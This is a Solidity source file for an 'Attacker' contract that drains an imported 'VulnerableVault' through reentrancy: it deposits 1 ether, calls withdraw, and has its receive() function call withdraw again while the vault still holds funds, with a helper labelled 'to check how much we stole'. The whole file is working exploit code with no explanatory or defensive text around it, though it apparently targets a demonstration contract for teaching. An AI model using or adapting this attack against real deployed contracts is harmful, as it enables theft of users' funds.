// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vulnerable.sol";

contract Attacker {
    VulnerableVault public vault;

    constructor(address _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
    }

    // 1. The entry point for the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH to start attack");
        
        // Deposit 1 Ether to get a valid balance in the Vault
        vault.deposit{value: 1 ether}();

        // Start the recursive withdrawal
        vault.withdraw();
    }

    // 2. The Trap: Receive Ether and call withdraw again immediately
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    // Helper to check how much we stole
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
